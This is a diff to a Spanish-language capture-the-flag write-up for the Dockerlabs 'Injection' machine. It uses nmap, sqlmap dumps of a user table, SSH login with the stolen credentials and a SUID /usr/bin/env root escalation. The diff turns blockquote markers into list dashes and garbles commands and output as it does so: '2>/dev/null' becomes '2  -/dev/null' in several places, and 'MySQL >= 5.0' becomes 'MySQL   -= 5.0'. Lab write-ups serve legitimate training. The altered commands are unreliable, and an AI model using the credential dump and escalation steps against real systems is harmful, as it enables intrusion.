@@ -16,14 +16,14 @@ tags:
 # Datos
 
 [!INFO] Injection
->  **Nombre:** Injection
->  **SO:** Linux
->  **Dificultad:** Muy fácil
->  **Enlace:** [Dockerlabs](https://dockerlabs.es/)
+  -  **Nombre:** Injection
+  -  **SO:** Linux
+  -  **Dificultad:** Muy fácil
+  -  **Enlace:** [Dockerlabs](https://dockerlabs.es/)
 
 [!TODO] Objetivo
-> 🚩Ingresar a la maquina como algún usuario.
-> 🚩Elevar privilegios una vez obtenido el acceso.
+  - 🚩Ingresar a la maquina como algún usuario.
+  - 🚩Elevar privilegios una vez obtenido el acceso.
 
 El primer paso consiste en iniciar la máquina, lo cual es tan sencillo como ejecutar el siguiente comando después de haber descargado la maquina:
 
@@ -33,7 +33,7 @@ El primer paso consiste en iniciar la máquina, lo cual es tan sencillo como eje
 
 # Reconocimiento
 
-> Una vez iniciada la maquina, el mismo script de inicio me da la dirección IP a lo cual procedo a realizar un escaneo de puertos de la maquina y el resultado es el siguiente:
+  - Una vez iniciada la maquina, el mismo script de inicio me da la dirección IP a lo cual procedo a realizar un escaneo de puertos de la maquina y el resultado es el siguiente:
 
 ```bash
 └─# nmap 172.17.0.2
@@ -66,7 +66,7 @@ Lo que busco con este comando es que me muestre todas las base de datos que se e
 [15:44:52] [INFO] the back-end DBMS is MySQL
 web server operating system: Linux Ubuntu 22.04 (jammy)
 web application technology: Apache 2.4.52
-back-end DBMS: MySQL >= 5.0 (MariaDB fork)
+back-end DBMS: MySQL   -= 5.0 (MariaDB fork)
 [15:44:52] [INFO] fetching database names
 [15:44:52] [INFO] retrieved: 'information_schema'
 [15:44:52] [INFO] retrieved: 'register'
@@ -106,18 +106,18 @@ Con esto logro obtener un usuario y contraseña validos para acceder al formular
 
 ![dylanInjection.png](https://raw.githubusercontent.com/4k4m1m3/blog/main/_posts/adjuntos/dylanInjection.png)
 
->> **Nota:** Si deseas conocer más información sobre inyecciones SQL o el uso de SQLmap, te invito a visitar la [Academia de Ciberseguridad y Hacking Ético](https://elrincondelhacker.es/) donde te enseñan de estos y otros temas.
+  - **Nota:** Si deseas conocer más información sobre inyecciones SQL o el uso de SQLmap, te invito a visitar la [Academia de Ciberseguridad y Hacking Ético](https://elrincondelhacker.es/) donde te enseñan de estos y otros temas.
 
 # Acceso por SSH
 
-> Lo interesante es que usando las credenciales encontradas con SQLmap he logrado ingresar por SSH a esta maquina, así que estando con el usuario `dylan` por SSH procedo a realizar un `sudo -l` y para mi sorpresa el resultado es:
+  - Lo interesante es que usando las credenciales encontradas con SQLmap he logrado ingresar por SSH a esta maquina, así que estando con el usuario `dylan` por SSH procedo a realizar un `sudo -l` y para mi sorpresa el resultado es:
 
 `-bash: sudo: command not found`
 
-Paso a revisar el directorio `/var/www/html` para chequear los permisos y los archivos allí, pero no encuentro nada especial, así que lo otro que intento es: `find / -perm -4000 -ls 2>/dev/null` y el resultado es el siguiente:
+Paso a revisar el directorio `/var/www/html` para chequear los permisos y los archivos allí, pero no encuentro nada especial, así que lo otro que intento es: `find / -perm -4000 -ls 2  -/dev/null` y el resultado es el siguiente:
 
 ```bash
-dylan@e4df575277c7:~$ find / -perm -4000 -ls 2>/dev/null
+dylan@e4df575277c7:~$ find / -perm -4000 -ls 2  -/dev/null
   1464485     72 -rwsr-xr-x   1 root     root        72712 Feb  6 13:54 /usr/bin/chfn
   1464553     72 -rwsr-xr-x   1 root     root        72072 Feb  6 13:54 /usr/bin/gpasswd
   1464611     48 -rwsr-xr-x   1 root     root        47480 Feb 21  2022 /usr/bin/mount
@@ -144,7 +144,7 @@ Me voy para nuestra plataforma favorita [GTFOBins](https://gtfobins.github.io/) 
 - **/usr/bin/env:** Shell - SUID - Sudo
 # Escalada de privilegios
 
-Y allí encontramos, con mucha paciencia el script vulnerable `/usr/bin/env` a `SUID`, así que según el sitio [env | GTFOBins](https://gtfobins.github.io/gtfobins/env/#suid) si coloco:
+Y allí encontramos, con mucha paciencia el script vulnerable `/usr/bin/env` a `SUID`, así que según el sitio [GTFOBins] si coloco:
 
 ```
 sudo install -m =xs $(which env) .
@@ -163,14 +163,14 @@ Y allí si estamos dentro (¡PWNED!)
 # Comandos
 
 [!IMPORTANT] Resumen de comandos utilizados
-> `sudo bash auto_deploy.sh injection.tar`
-> `nmap 172.17.0.2`
-> `sqlmap -u http://172.17.0.2 --forms --dbs --batch`
-> `sqlmap -u http://172.17.0.2 --forms -D register --tables --batch`
-> `sqlmap -u http://172.17.0.2 --forms -D register -T users --columns --batch`
-> `sqlmap -u http://172.17.0.2 --forms -D register -T users -C passwd,username --dump --batch`
-> `find / -perm -4000 -ls 2>/dev/null`
-> `/usr/bin/env /bin/sh -p`
+  - `sudo bash auto_deploy.sh injection.tar`
+  - `nmap 172.17.0.2`
+  - `sqlmap -u http://172.17.0.2 --forms --dbs --batch`
+  - `sqlmap -u http://172.17.0.2 --forms -D register --tables --batch`
+  - `sqlmap -u http://172.17.0.2 --forms -D register -T users --columns --batch`
+  - `sqlmap -u http://172.17.0.2 --forms -D register -T users -C passwd,username --dump --batch`
+  - `find / -perm -4000 -ls 2  -/dev/null`
+  - `/usr/bin/env /bin/sh -p`
 
 
 ```
